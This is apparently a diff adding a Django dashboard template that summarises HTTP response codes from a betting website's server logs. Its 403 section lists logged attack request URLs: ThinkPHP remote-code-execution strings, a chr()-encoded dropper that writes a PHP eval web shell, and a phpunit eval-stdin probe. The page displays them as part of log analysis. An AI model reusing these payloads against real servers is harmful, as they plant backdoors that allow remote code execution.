@@ -1,0 +1,762 @@
+{% extends 'base.html' %}
+{% load i18n static %}
+{% load static %}
+{% block content %}
+<body id="page-top">
+{%include 'navbar.html' %}
+
+ 
+                <h1 style="color: var(--bs-gray-100);background: #2f4b7c;">Analog - Health Dashboard: Response code analysis</h1>
+                <div class="row" style="margin-left: 0px;margin-right: 0px;">
+                    <div class="col" style="box-shadow: 0px 0px 0px var(--bs-gray-600);">
+                        <div class="card">
+                            <div class="card-body" style="text-shadow: 0px 0px;transform: perspective(0px);height: 225px;">
+                                <h4 class="card-title" style="color: var(--bs-gray-100);background: #2f4b7c;border-radius: 0;text-align: left;">&nbsp;<i class="fa fa-sun-o"></i>&nbsp; Health Score</h4>
+                                <div class="row">
+                                    <div class="col">
+                                        <h1 style="height: 73px;font-size: 68px;color: #063970;font-weight: bold;">86%</h1>
+                                    </div>
+                                    <div class="col"><i class="fa fa-check-square-o" style="height: 10px;font-size: 100px;color: var(--bs-success);"></i></div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col">
+                        <div class="card">
+                            <div class="card-body" style="height: 225px;">
+                                <h4 class="card-title" style="color: var(--bs-gray-100);background: #2f4b7c;">&nbsp;<i class="far fa-comment-dots"></i>&nbsp; &nbsp;Project Details</h4>
+                                <h6 class="text-muted card-subtitle mb-2">Team: Organic Performance</h6>
+                                <h6 class="text-muted card-subtitle mb-2">Project Name: bettingsidor-log-app</h6>
+                                <h6 class="text-muted card-subtitle mb-2">Created: 21.11.2011</h6>
+                                <h6 class="text-muted card-subtitle mb-2">status: Active</h6>
+                                <h6 class="text-muted card-subtitle mb-2">Author: administrator</h6>
+                                <h6 class="text-muted card-subtitle mb-2">Shareable: false</h6>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col">
+                        <div class="card">
+                            <div class="card-body" style="height: 225px;">
+                                <h4 class="card-title" style="background: #2f4b7c;color: var(--bs-gray-100);">&nbsp;<i class="fa fa-file"></i>&nbsp;File Details</h4>
+                                <h6 class="text-muted card-subtitle mb-2">Number of rows: 1570000</h6>
+                                <h6 class="text-muted card-subtitle mb-2">Number of columns: 24</h6>
+                                <h6 class="text-muted card-subtitle mb-2">date range: 01/01/21 - 01/06/21</h6>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col">
+                        <div class="card">
+                            <div class="card-body" style="height: 225px;">
+                                <h4 class="card-title" style="color: var(--bs-gray-100);background: #2f4b7c;"><i class="fas fa-brain"></i>Knowledge Base</h4>
+                                <h6 class="text-muted card-subtitle mb-2">Related topic knowledge resources</h6><a class="card-link" href="#">Log Files Anathomy</a><a class="card-link" href="#">Response Codes</a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="row">
+                    <div class="col" style="margin-left: 12px;">
+                        <div class="row">
+                            <div class="col" style="margin-left: 13px;">
+                                <h1 style="color: var(--bs-light);background: #2f4b7c;">Overview</h1>
+                            </div>
+                        </div>
+                        <div class="row">
+                            <div class="col" style="margin-left: 12px;margin-right: 12px;"><img src="{% static '/assets/img/codes.png' %}" style="width: 550px;height: 403px;"></div>
+                            <div class="col" style="margin-left: 12px;margin-right: 12px;"><img src="{% static '/assets/img/download.png' %}" style="width: 550px;"></div>
+                            <div class="col" style="margin-left: 9px;width: 300px;">
+                                <div class="table-responsive" style="width: 500px;font-size: 12px;height: 403px;">
+                                    <table class="table">
+                                        <thead>
+                                            <tr>
+                                                <th>&nbsp;STATUS CODE</th>
+                                                <th>OCCURANCE</th>
+                                                <th>DESCRIPTION</th>
+                                            </tr>
+                                        </thead>
+                                        <tbody>
+                                            <tr>
+                                                <td>200</td>
+                                                <td>68262</td>
+                                                <td>Success</td>
+                                            </tr>
+                                            <tr>
+                                                <td class="table-warning" style="background: rgb(250,219,216);">404</td>
+                                                <td class="table-warning" style="background: rgb(250,219,216);">4775</td>
+                                                <td class="table-warning" style="background: rgb(250,219,216);">Page Not found</td>
+                                            </tr>
+                                            <tr>
+                                                <td>301</td>
+                                                <td>1927</td>
+                                                <td>Requested resource has been temporary moved</td>
+                                            </tr>
+                                            <tr>
+                                                <td>304</td>
+                                                <td>1146</td>
+                                                <td>Not modified since last visit</td>
+                                            </tr>
+                                            <tr>
+                                                <td>403</td>
+                                                <td>589</td>
+                                                <td>Forbidden</td>
+                                            </tr>
+                                            <tr>
+                                                <td class="table-danger">500</td>
+                                                <td class="table-danger">32</td>
+                                                <td class="table-danger">Internal Server error</td>
+                                            </tr>
+                                            <tr>
+                                                <td class="table-danger">400</td>
+                                                <td class="table-danger">15</td>
+                                                <td class="table-danger">Bad request</td>
+                                            </tr>
+                                            <tr>
+                                                <td>302</td>
+                                                <td>10</td>
+                                                <td>Requested resource has been temporarily moved...</td>
+                                            </tr>
+                                        </tbody>
+                                    </table>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div><!-- Start: #mainContainer -->
+                <div class="container container-fluid">
+                    <!-- Start: #Error500 -->
+                    <div class="row">
+                        <div class="col" style="margin-top: 99px;">
+                            <!-- Start: 500 -->
+                            <div class="card" style="margin-bottom: 0;padding-bottom: 0;">
+                                <!-- Start: 500 -->
+                                <div class="card-body" style="margin-bottom: 0;">
+                                    <h4 class="card-title" style="background: #346888;color: var(--bs-light);font-weight: bold;"><i class="fa fa-commenting-o"></i><i class="fa fa-download float-sm-end"></i>&nbsp; &nbsp; &nbsp;Status Code 200 - Status OK!&nbsp;<br></h4>
+                                    <div class="container">
+                                        <div class="row justify-content-md-center">
+                                            <!-- Start: #graps -->
+                                            <div class="col-8">
+                                                <!-- Start: #Heading -->
+                                                <div class="row">
+                                                    <h6 class="font-monospace">Total:&nbsp;<span style="font-weight: bold;">32 URLs affected</span></h6>
+                                                    <div class="col">
+                                                        <div class="table-responsive">
+                                                            <table class="table">
+                                                                <thead>
+                                                                    <tr>
+                                                                        <th>URL</th>
+                                                                        <th>OCCURENCE</th>
+                                                                    </tr>
+                                                                </thead>
+                                                                <tbody>
+                                                                    <tr>
+                                                                        <td>https://bettingsidor.se/mello/</td>
+                                                                        <td>207408</td>
+                                                                    </tr>
+                                                                    <tr>
+                                                                        <td>https://bettingsidor.se/vm/page/2/<br></td>
+                                                                        <td>167333<br></td>
+                                                                    </tr>
+                                                                    <tr>
+                                                                        <td>https://bettingsidor.se/vm/<br></td>
+                                                                        <td>5</td>
+                                                                    </tr>
+                                                                    <tr>
+                                                                        <td>https://bettingsidor.se/vm/page/4/<br></td>
+                                                                        <td>3</td>
+                                                                    </tr>
+                                                                    <tr>
+                                                                        <td>https://bettingsidor.se/vm/page/3/<br></td>
+                                                                        <td>3</td>
+                                                                    </tr>
+                                                                </tbody>
+                                                            </table>
+                                                        </div>
+                                                    </div>
+                                                </div><!-- End: #Heading -->
+                                                <!-- Start: #Up -->
+                                                <div class="row">
+                                                    <div class="col"></div>
+                                                </div><!-- End: #Up -->
+                                            </div><!-- End: #graps -->
+                                            <!-- Start: #form -->
+                                            <div class="col-4">
+                                                <div class="row">
+                                                    <div><a class="btn btn-primary" data-bs-toggle="collapse" aria-expanded="true" aria-controls="collapse-4" href="#collapse-4" role="button">CODE EXPLANATION</a>
+                                                        <div class="collapse show" id="collapse-4">
+                                                            <p>Standard response for successful HTTP requests. The actual response will depend on the request method used. In a GET request, the response will contain an entity corresponding to the requested resource. In a POST request, the response will contain an entity describing or containing the result of the action</p>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div><a class="btn btn-primary" data-bs-toggle="collapse" aria-expanded="true" aria-controls="collapse-1" href="#collapse-1" role="button" style="margin-top: 22px;">ADD NOTES</a>
+                                                    <div class="collapse show" id="collapse-1">
+                                                        <p>Add notes here. Use up to 300 words without special characters!</p><textarea style="width: 358px;"></textarea><button class="btn btn-primary" type="button">SAVE</button>
+                                                    </div>
+                                                </div>
+                                            </div><!-- End: #form -->
+                                        </div>
+                                    </div>
+                                </div><!-- End: 500 -->
+                                <!-- Start: 500 -->
+                                <div class="card-body" style="margin-bottom: 0;">
+                                    <h4 class="card-title" style="background: #346888;color: var(--bs-light);font-weight: bold;"><i class="fa fa-commenting-o"></i><i class="fa fa-download float-sm-end"></i>&nbsp; &nbsp; &nbsp;Status Code 500 - Internal Server Error&nbsp;<br></h4>
+                                    <div class="container">
+                                        <div class="row justify-content-md-center">
+                                            <!-- Start: #graps -->
+                                            <div class="col-8">
+                                                <!-- Start: #Heading -->
+                                                <div class="row">
+                                                    <h6 class="font-monospace">Total:&nbsp;<span style="font-weight: bold;">32 URLs affected</span></h6>
+                                                    <div class="col">
+                                                        <div class="table-responsive">
+                                                            <table class="table">
+                                                                <thead>
+                                                                    <tr>
+                                                                        <th>URL</th>
+                                                                        <th>OCCURENCE</th>
+                                                                    </tr>
+                                                                </thead>
+                                                                <tbody>
+                                                                    <tr>
+                                                                        <td>https://www.goal.pl/transfery/</td>
+                                                                        <td>19</td>
+                                                                    </tr>
+                                                                    <tr>
+                                                                        <td>https://www.goal.pl/transfery/<br></td>
+                                                                        <td>16</td>
+                                                                    </tr>
+                                                                    <tr>
+                                                                        <td>https://www.goal.pl/aktualnosci/<br></td>
+                                                                        <td>15</td>
+                                                                    </tr>
+                                                                    <tr>
+                                                                        <td>https://www.goal.pl/mundial/<br></td>
+                                                                        <td>14</td>
+                                                                    </tr>
+                                                                    <tr>
+                                                                        <td>https://www.goal.pl/kadra/<br></td>
+                                                                        <td>13</td>
+                                                                    </tr>
+                                                                </tbody>
+                                                            </table>
+                                                        </div>
+                                                    </div>
+                                                </div><!-- End: #Heading -->
+                                                <!-- Start: #Up -->
+                                                <div class="row">
+                                                    <div class="col"></div>
+                                                </div><!-- End: #Up -->
+                                            </div><!-- End: #graps -->
+                                            <!-- Start: #form -->
+                                            <div class="col-4">
+                                                <div class="row">
+                                                    <div><a class="btn btn-primary" data-bs-toggle="collapse" aria-expanded="true" aria-controls="collapse-15" href="#collapse-15" role="button">CODE EXPLANATION</a>
+                                                        <div class="collapse show" id="collapse-15">
+                                                            <p>The 500 Internal Server Error is a very general HTTP status code that means&nbsp;<strong>something has gone wrong on the web site's server</strong>&nbsp;but the server could not be more specific on what the exact problem is.</p>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div><a class="btn btn-primary" data-bs-toggle="collapse" aria-expanded="true" aria-controls="collapse-16" href="#collapse-16" role="button" style="margin-top: 22px;">ADD NOTES</a>
+                                                    <div class="collapse show" id="collapse-16">
+                                                        <p>Add notes here. Use up to 300 words without special characters!</p><textarea style="width: 358px;"></textarea><button class="btn btn-primary" type="button">SAVE</button>
+                                                    </div>
+                                                </div>
+                                            </div><!-- End: #form -->
+                                        </div>
+                                    </div>
+                                </div><!-- End: 500 -->
+                            </div><!-- End: 500 -->
+                        </div>
+                    </div><!-- End: #Error500 -->
+                    <!-- Start: error400 -->
+                    <div class="row">
+                        <div class="col">
+                            <!-- Start: 500 -->
+                            <div class="card" style="margin-bottom: 0;padding-bottom: 0;">
+                                <!-- Start: 500 -->
+                                <div class="card-body" style="margin-bottom: 0;">
+                                    <h4 class="card-title" style="background: #346888;color: var(--bs-light);font-weight: bold;"><i class="fa fa-commenting-o"></i><i class="fa fa-download float-sm-end"></i>&nbsp; &nbsp; &nbsp;Status Code 400 -&nbsp;<strong>&nbsp;Bad request</strong><br></h4>
+                                    <div class="container">
+                                        <div class="row justify-content-md-center">
+                                            <!-- Start: #graps -->
+                                            <div class="col-8">
+                                                <!-- Start: #Heading -->
+                                                <div class="row">
+                                                    <h6 class="font-monospace"><span></span>Total:&nbsp;<span style="font-weight: bold;">15 URLs affected</span></h6>
+                                                </div><!-- End: #Heading -->
+                                                <!-- Start: #Up -->
+                                                <div class="row">
+                                                    <div class="col">
+                                                        <div class="table-responsive">
+                                                            <table class="table">
+                                                                <thead>
+                                                                    <tr>
+                                                                        <th>URL</th>
+                                                                        <th>OCCURENCE</th>
+                                                                    </tr>
+                                                                </thead>
+                                                                <tbody>
+                                                                    <tr>
+                                                                        <td>https://bettingsidor.se/wp-admin/admin-ajax.php<br></td>
+                                                                        <td>6</td>
+                                                                    </tr>
+                                                                    <tr>
+                                                                        <td>https://bettingsidor.se/<br></td>
+                                                                        <td>6</td>
+                                                                    </tr>
+                                                                    <tr>
+                                                                        <td>https://bettingsidor.se/wp-admin/admin-ajax.php?action=loadModal&amp;cat=null<br></td>
+                                                                        <td>3</td>
+                                                                    </tr>
+                                                                </tbody>
+                                                            </table>
+                                                        </div>
+                                                    </div>
+                                                </div><!-- End: #Up -->
+                                            </div><!-- End: #graps -->
+                                            <!-- Start: #form -->
+                                            <div class="col-4">
+                                                <div class="row">
+                                                    <div><a class="btn btn-primary" data-bs-toggle="collapse" aria-expanded="true" aria-controls="collapse-3" href="#collapse-3" role="button">CODE EXPLANATION</a>
+                                                        <div class="collapse show" id="collapse-3">
+                                                            <p>The HyperText Transfer Protocol (HTTP) 400 Bad Request response status code indicates that the server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid request message framing, or deceptive request routing).</p>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div><a class="btn btn-primary" data-bs-toggle="collapse" aria-expanded="true" aria-controls="collapse-2" href="#collapse-2" role="button" style="margin-top: 22px;">ADD NOTES</a>
+                                                    <div class="collapse show" id="collapse-2">
+                                                        <p>Add notes here. Use up to 300 words without special characters!</p><textarea style="width: 358px;"></textarea><button class="btn btn-primary" type="button">SAVE</button>
+                                                    </div>
+                                                </div>
+                                            </div><!-- End: #form -->
+                                        </div>
+                                    </div>
+                                </div><!-- End: 500 -->
+                            </div><!-- End: 500 -->
+                        </div>
+                    </div><!-- End: error400 -->
+                    <!-- Start: error403 -->
+                    <div class="row">
+                        <div class="col">
+                            <!-- Start: 403 -->
+                            <div class="card" style="margin-bottom: 0;padding-bottom: 0;">
+                                <!-- Start: 500 -->
+                                <div class="card-body" style="margin-bottom: 0;">
+                                    <h4 class="card-title" style="background: #346888;color: var(--bs-light);font-weight: bold;"><i class="fa fa-commenting-o"></i><i class="fa fa-download float-sm-end" style="font-size: 32px;color: var(--bs-gray-100);" title="Download"></i>&nbsp; &nbsp; &nbsp;Status Code 403 -&nbsp;<strong>&nbsp;Forbidden</strong><br></h4>
+                                    <div class="container">
+                                        <div class="row justify-content-md-center">
+                                            <!-- Start: #graps -->
+                                            <div class="col-8">
+                                                <!-- Start: #Heading -->
+                                                <div class="row">
+                                                    <h6 class="font-monospace">Total:&nbsp;<span style="font-weight: bold;">589 URLs affected&nbsp; &nbsp;&nbsp;</span><span style="font-weight: bold;"></span></h6>
+                                                </div><!-- End: #Heading -->
+                                                <!-- Start: #Up -->
+                                                <div class="row">
+                                                    <div class="col">
+                                                        <h5><strong>Referring Page&nbsp; &nbsp;&nbsp;</strong><span></span><br></h5>
+                                                        <div class="table-responsive">
+                                                            <table class="table">
+                                                                <thead>
+                                                                    <tr>
+                                                                        <th>URL</th>
+                                                                        <th>OCCURENCE</th>
+                                                                    </tr>
+                                                                </thead>
+                                                                <tbody>
+                                                                    <tr>
+                                                                        <td><a href="https://bettingsidor.se/wp-admin/admin-ajax.php" target="_blank">https://bettingsidor.se/wp-admin/admin-ajax.php</a><br></td>
+                                                                        <td>258</td>
+                                                                    </tr>
+                                                                    <tr>
+                                                                        <td><a href="https://bettingsidor.se/" target="_blank">https://bettingsidor.se/</a><br></td>
+                                                                        <td>51</td>
+                                                                    </tr>
+                                                                    <tr>
+                                                                        <td><a href="https://bettingsidor.se//index.php" target="_blank">https://bettingsidor.se//index.php</a><br></td>
+                                                                        <td>12</td>
+                                                                    </tr>
+                                                                    <tr>
+                                                                        <td><a href="https://bettingsidor.se/wp-content/uploads/bc-modals-data/modals-data/" target="_blank">https://bettingsidor.se/wp-content/uploads/bc-modals-data/modals-data/</a><br></td>
+                                                                        <td>8</td>
+                                                                    </tr>
+                                                                    <tr>
+                                                                        <td><a href="https://bettingsidor.se//vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" target="_blank">https://bettingsidor.se//vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</a><br></td>
+                                                                        <td>6</td>
+                                                                    </tr>
+                                                                </tbody>
+                                                            </table>
+                                                        </div>
+                                                    </div>
+                                                </div><!-- End: #Up -->
+                                                <!-- Start: #Down -->
+                                                <div class="row">
+                                                    <h5 style="margin-top: 32px;">Referring Page -&nbsp;<span style="font-weight: bold;">Unusually long URLs - 35 pages detected&nbsp; &nbsp;&nbsp;<i class="fa fa-download" style="font-size: 35px;color: var(--bs-green);" title="Download"></i></span></h5>
+                                                    <div class="col">
+                                                        <div class="table-responsive">
+                                                            <table class="table">
+                                                                <thead>
+                                                                    <tr>
+                                                                        <th>URL</th>
+                                                                        <th>length</th>
+                                                                    </tr>
+                                                                </thead>
+                                                                <tbody>
+                                                                    <tr>
+                                                                        <td><a href="https://bettingsidor.se/wp-admin/admin-ajax.php" target="_blank">https://bettingsidor.se/betalningsmetoder/neteller/</a><br></td>
+                                                                        <td>51</td>
+                                                                    </tr>
+                                                                    <tr>
+                                                                        <td><a href="https://bettingsidor.se/" target="_blank">https://bettingsidor.se//utility/convert/index.php?a=config&amp;source=d7.2_x2.0</a><br></td>
+                                                                        <td>76</td>
+                                                                    </tr>
+                                                                    <tr>
+                                                                        <td><a href="https://bettingsidor.se//index.php" target="_blank">https://bettingsidor.se//plus/digg_ajax.php?id=1024e1024&amp;*/fputs(fopen(chr(46).chr(46).chr(47).chr(100).chr(97).chr(116).chr(97).chr(47).chr(99).chr(97).chr(99).chr(104).chr(101).chr(47).chr(116).chr(46).chr(112).chr(104).chr(112),chr(119).chr(43)),chr(60).chr(63).chr(112).chr(104).chr(112).chr(32).chr(101).chr(118).chr(97).chr(108).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(39).chr(116).chr(39).chr(93).chr(41).chr(59).chr(63).chr(62));/*</a><br></td>
+                                                                        <td>467</td>
+                                                                    </tr>
+                                                                    <tr>
+                                                                        <td><a href="https://bettingsidor.se/wp-content/uploads/bc-modals-data/modals-data/" target="_blank">https://bettingsidor.se//?s=index/\\x5Cthink\\x5Ctemplate\\x5Cdriver\\x5Cfile/write&amp;cacheFile=robots1.php&amp;content=xbshell&lt;?php%20@eval($_POST[admin]);?&gt;</a><br></td>
+                                                                        <td>148</td>
+                                                                    </tr>
+                                                                    <tr>
+                                                                        <td class="text-truncate shadow"><a href="https://bettingsidor.se//vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" target="_blank">https://bettingsidor.se//?s=index/think\\x5Capp/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=12345.php&amp;vars[1][1]=php%20$poc%20=\\x22axsxsxexrxt\\x22;$poc_1%20=%20explode(\\x22x\\x22,%20$poc);%20$poc_2%20=%20$poc_1[0]%20.%20$poc_1[1]%20.%20$poc_1[2]%20.%20$poc_1[3].%20$poc_1[4].%20$poc_1[5];$poc_2(urldecode(urldecode(urldecode($_REQUEST['12345']))));?&gt;</a><br></td>
+                                                                        <td>387</td>
+                                                                    </tr>
+                                                                </tbody>
+                                                            </table>
+                                                        </div>
+                                                    </div>
+                                                </div><!-- End: #Down -->
+                                            </div><!-- End: #graps -->
+                                            <!-- Start: #form -->
+                                            <div class="col-4">
+                                                <div class="row">
+                                                    <div><a class="btn btn-primary" data-bs-toggle="collapse" aria-expanded="true" aria-controls="collapse-5" href="#collapse-5" role="button">CODE EXPLANATION</a>
+                                                        <div class="collapse show" id="collapse-5">
+                                                            <p>The HTTP 403 Forbidden client error status response code indicates that&nbsp;<strong>the server understands the request but refuses to authorize it</strong>. This status is similar to 401 , but in this case, re-authenticating will make no difference.</p>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div><a class="btn btn-primary" data-bs-toggle="collapse" aria-expanded="true" aria-controls="collapse-6" href="#collapse-6" role="button" style="margin-top: 22px;">ADD NOTES</a>
+                                                    <div class="collapse show" id="collapse-6">
+                                                        <p>Add notes here. Use up to 300 words without special characters!</p><textarea style="width: 358px;"></textarea><button class="btn btn-primary" type="button">SAVE</button>
+                                                    </div>
+                                                </div>
+                                            </div><!-- End: #form -->
+                                        </div>
+                                    </div>
+                                </div><!-- End: 500 -->
+                            </div><!-- End: 403 -->
+                        </div>
+                    </div><!-- End: error403 -->
+                    <!-- Start: error404 -->
+                    <div class="row">
+                        <div class="col">
+                            <!-- Start: 500 -->
+                            <div class="card" style="margin-bottom: 0;padding-bottom: 0;">
+                                <!-- Start: 500 -->
+                                <div class="card-body" style="margin-bottom: 0;">
+                                    <h4 class="card-title" style="background: #346888;color: var(--bs-light);font-weight: bold;"><i class="fa fa-commenting-o"></i><i class="fa fa-download float-sm-end" title="Download"></i>&nbsp; &nbsp; &nbsp;Status Code 404 -&nbsp;<strong>&nbsp;Page Not Found</strong><br></h4>
+                                    <div class="container">
+                                        <div class="row justify-content-md-center">
+                                            <!-- Start: #graps -->
+                                            <div class="col-8">
+                                                <!-- Start: #Heading -->
+                                                <div class="row">
+                                                    <h6 class="font-monospace"><span></span>Total:&nbsp;<span style="font-weight: bold;">1698 URLs affected</span></h6>
+                                                </div><!-- End: #Heading -->
+                                                <!-- Start: #Up -->
+                                                <div class="row">
+                                                    <div class="col">
+                                                        <div class="table-responsive">
+                                                            <table class="table">
+                                                                <thead>
+                                                                    <tr>
+                                                                        <th>URL</th>
+                                                                        <th>OCCURENCE</th>
+                                                                    </tr>
+                                                                </thead>
+                                                                <tbody>
+                                                                    <tr>
+                                                                        <td>https://bettingsidor.se/utan-registrering/images/index_mv_img01.jpg<br></td>
+                                                                        <td>29</td>
+                                                                    </tr>
+                                                                    <tr>
+                                                                        <td class="text-truncate">https://bettingsidor.se/akindo/common/images/footer_logo.jpg<br></td>
+                                                                        <td>29</td>
+                                                                    </tr>
+                                                                    <tr>
+                                                                        <td class="text-truncate">https://bettingsidor.se/edenki/images/news/160914/ecb1609140841001-s1.jpg<br></td>
+                                                                        <td>28</td>
+                                                                    </tr>
+                                                                    <tr>
+                                                                        <td class="text-truncate">https://bettingsidor.se/imaju/m-c855bs-fsy6-1<br></td>
+                                                                        <td>28</td>
+                                                                    </tr>
+                                                                    <tr>
+                                                                        <td class="text-truncate">https://bettingsidor.se/voice-5538/ses-7678/<br></td>
+                                                                        <td>27</td>
+                                                                    </tr>
+                                                                </tbody>
+                                                            </table>
+                                                        </div>
+                                                    </div>
+                                                </div><!-- End: #Up -->
+                                                <div class="col">
+                                                    <!-- Start: Bar Chart -->
+                                                    <div class="chart-area"><canvas data-bss-chart="{&quot;type&quot;:&quot;bar&quot;,&quot;data&quot;:{&quot;labels&quot;:[&quot;png&quot;,&quot;page or directorium&quot;,&quot;.jpg&quot;,&quot;jpeg&quot;],&quot;datasets&quot;:[{&quot;label&quot;:&quot;type&quot;,&quot;backgroundColor&quot;:&quot;#c1e7ff&quot;,&quot;borderColor&quot;:&quot;#4e73df&quot;,&quot;data&quot;:[&quot;7841&quot;,&quot;6251&quot;,&quot;14984&quot;,&quot;9821&quot;]}]},&quot;options&quot;:{&quot;maintainAspectRatio&quot;:false,&quot;legend&quot;:{&quot;display&quot;:false,&quot;labels&quot;:{&quot;fontStyle&quot;:&quot;normal&quot;}},&quot;title&quot;:{&quot;fontStyle&quot;:&quot;normal&quot;},&quot;scales&quot;:{&quot;xAxes&quot;:[{&quot;gridLines&quot;:{&quot;color&quot;:&quot;rgb(234, 236, 244)&quot;,&quot;zeroLineColor&quot;:&quot;rgb(234, 236, 244)&quot;,&quot;drawBorder&quot;:false,&quot;drawTicks&quot;:false,&quot;borderDash&quot;:[&quot;2&quot;],&quot;zeroLineBorderDash&quot;:[&quot;2&quot;],&quot;drawOnChartArea&quot;:true},&quot;ticks&quot;:{&quot;fontColor&quot;:&quot;#858796&quot;,&quot;fontStyle&quot;:&quot;normal&quot;,&quot;padding&quot;:20}}],&quot;yAxes&quot;:[{&quot;gridLines&quot;:{&quot;color&quot;:&quot;rgb(234, 236, 244)&quot;,&quot;zeroLineColor&quot;:&quot;rgb(234, 236, 244)&quot;,&quot;drawBorder&quot;:false,&quot;drawTicks&quot;:false,&quot;borderDash&quot;:[&quot;2&quot;],&quot;zeroLineBorderDash&quot;:[&quot;2&quot;]},&quot;ticks&quot;:{&quot;fontColor&quot;:&quot;#858796&quot;,&quot;fontStyle&quot;:&quot;normal&quot;,&quot;padding&quot;:20}}]}}}"></canvas></div><!-- End: Bar Chart -->
+                                                </div>
+                                            </div><!-- End: #graps -->
+                                            <!-- Start: #form -->
+                                            <div class="col-4">
+                                                <div class="row">
+                                                    <div><a class="btn btn-primary" data-bs-toggle="collapse" aria-expanded="true" aria-controls="collapse-7" href="#collapse-7" role="button">CODE EXPLANATION</a>
+                                                        <div class="collapse show" id="collapse-7">
+                                                            <p>The HTTP 404, 404 not found, 404, 404 error, page not found or file not found error message is a hypertext transfer protocol standard response code, in computer network communications, to indicate that the browser was able to communicate with a given server, but the server could not find what was requested.</p>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div><a class="btn btn-primary" data-bs-toggle="collapse" aria-expanded="true" aria-controls="collapse-8" href="#collapse-8" role="button" style="margin-top: 22px;">ADD NOTES</a>
+                                                    <div class="collapse show" id="collapse-8">
+                                                        <p>Add notes here. Use up to 300 words without special characters!</p><textarea style="width: 358px;"></textarea><button class="btn btn-primary" type="button">SAVE</button>
+                                                    </div>
+                                                </div>
+                                            </div><!-- End: #form -->
+                                        </div>
+                                    </div>
+                                </div><!-- End: 500 -->
+                            </div><!-- End: 500 -->
+                        </div>
+                    </div><!-- End: error404 -->
+                    <!-- Start: error301 -->
+                    <div class="row">
+                        <div class="col">
+                            <!-- Start: 500 -->
+                            <div class="card" style="margin-bottom: 0;padding-bottom: 0;">
+                                <!-- Start: 500 -->
+                                <div class="card-body" style="margin-bottom: 0;">
+                                    <h4 class="card-title" style="background: #346888;color: var(--bs-light);font-weight: bold;"><i class="fa fa-commenting-o"></i><i class="fa fa-download float-sm-end" title="Download"></i>&nbsp; &nbsp; &nbsp;Status Code 301 -&nbsp;<strong>&nbsp;Requested resource has been temporary moved</strong><br></h4>
+                                    <div class="container">
+                                        <div class="row justify-content-md-center">
+                                            <!-- Start: #graps -->
+                                            <div class="col-8">
+                                                <!-- Start: #Heading -->
+                                                <div class="row">
+                                                    <h6 class="font-monospace"><span></span>Total:&nbsp;<span style="font-weight: bold;">1927 URLs affected</span></h6>
+                                                </div><!-- End: #Heading -->
+                                                <!-- Start: #Up -->
+                                                <div class="row">
+                                                    <div class="col">
+                                                        <div class="table-responsive">
+                                                            <table class="table">
+                                                                <thead>
+                                                                    <tr>
+                                                                        <th>URL</th>
+                                                                        <th>OCCURENCE</th>
+                                                                    </tr>
+                                                                </thead>
+                                                                <tbody>
+                                                                    <tr>
+                                                                        <td><a href="https://bettingsidor.se/sitemap.xml" target="_blank">https://bettingsidor.se/sitemap.xml</a><br></td>
+                                                                        <td>95</td>
+                                                                    </tr>
+                                                                    <tr>
+                                                                        <td class="text-truncate"><a href="https://bettingsidor.se/till/casino-planet/" target="_blank">https://bettingsidor.se/till/casino-planet/</a><br></td>
+                                                                        <td>76</td>
+                                                                    </tr>
+                                                                    <tr>
+                                                                        <td class="text-truncate"><a href="https://bettingsidor.se/robots.txt" target="_blank">https://bettingsidor.se/robots.txt</a><br></td>
+                                                                        <td>66</td>
+                                                                    </tr>
+                                                                    <tr>
+                                                                        <td class="text-truncate"><a href="https://bettingsidor.se/" target="_blank">https://bettingsidor.se/</a><br></td>
+                                                                        <td>55</td>
+                                                                    </tr>
+                                                                    <tr>
+                                                                        <td class="text-truncate"><a href="https://bettingsidor.se/till/comeon-sportbonus/" target="_blank">https://bettingsidor.se/till/comeon-sportbonus/</a><br></td>
+                                                                        <td>15</td>
+                                                                    </tr>
+                                                                </tbody>
+                                                            </table>
+                                                        </div>
+                                                    </div>
+                                                </div><!-- End: #Up -->
+                                                <div class="col"><img src="{% static '/assets/img/bsd300.png' %}"></div>
+                                            </div><!-- End: #graps -->
+                                            <!-- Start: #form -->
+                                            <div class="col-4">
+                                                <div class="row">
+                                                    <div><a class="btn btn-primary" data-bs-toggle="collapse" aria-expanded="true" aria-controls="collapse-9" href="#collapse-9" role="button">CODE EXPLANATION</a>
+                                                        <div class="collapse show" id="collapse-9">
+                                                            <p>The HTTP response status code 301 Moved Permanently is used for permanent redirecting, meaning that links or records returning this response should be updated. The new URL should be provided in the Location field, included with the response.</p>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div><a class="btn btn-primary" data-bs-toggle="collapse" aria-expanded="true" aria-controls="collapse-10" href="#collapse-10" role="button" style="margin-top: 22px;">ADD NOTES</a>
+                                                    <div class="collapse show" id="collapse-10">
+                                                        <p>Add notes here. Use up to 300 words without special characters!</p><textarea style="width: 358px;"></textarea><button class="btn btn-primary" type="button">SAVE</button>
+                                                    </div>
+                                                </div>
+                                            </div><!-- End: #form -->
+                                        </div>
+                                    </div>
+                                </div><!-- End: 500 -->
+                            </div><!-- End: 500 -->
+                        </div>
+                    </div><!-- End: error301 -->
+                    <!-- Start: error302 -->
+                    <div class="row">
+                        <div class="col">
+                            <!-- Start: 403 -->
+                            <div class="card" style="margin-bottom: 0;padding-bottom: 0;">
+                                <!-- Start: 500 -->
+                                <div class="card-body" style="margin-bottom: 0;">
+                                    <h4 class="card-title" style="background: #346888;color: var(--bs-light);font-weight: bold;"><i class="fa fa-commenting-o"></i><i class="fa fa-download float-sm-end" style="font-size: 32px;color: var(--bs-gray-100);" title="Download"></i>&nbsp; &nbsp; &nbsp;Status Code 302 -&nbsp;<strong>&nbsp;Requested resource has been temporary moved</strong><br></h4>
+                                    <div class="container">
+                                        <div class="row justify-content-md-center">
